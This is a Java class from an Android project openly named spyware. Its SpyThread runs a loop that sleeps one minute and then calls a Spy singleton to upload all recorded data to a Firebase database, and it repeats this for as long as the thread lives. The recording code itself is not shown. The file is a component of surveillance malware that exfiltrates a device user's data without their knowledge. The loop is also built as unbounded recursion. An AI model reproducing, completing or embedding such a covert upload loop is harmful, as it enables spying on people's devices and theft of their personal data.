package com.example.cristianturetta.spyware;

import android.util.Log;

public class SpyThread extends Thread{
    private Spy spy = Spy.getInstance();
    /**
     * If this thread was constructed using a separate
     * <code>Runnable</code> run object, then that
     * <code>Runnable</code> object's <code>run</code> method is called;
     * otherwise, this method does nothing and returns.
     * <p>
     * Subclasses of <code>Thread</code> should override this method.
     *
     * @see #start()
     * @see #stop()
     */
    @Override
    public void run() {
        Log.d("SpyThread", "Running...");
        send(true);
    }

    /**
     * Using Spy class, it sends to Firebase database all recoded data every minutes
     *
     * @param state if state is true then data were sent
     * @return
     */
    private Boolean send(Boolean state){
        if (state){
            try {
                Thread.sleep(60000);
                spy.sendRecordedData();
                return send(true);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        Log.d("SpyThread", "Error sending data");
        return false;
    }
}
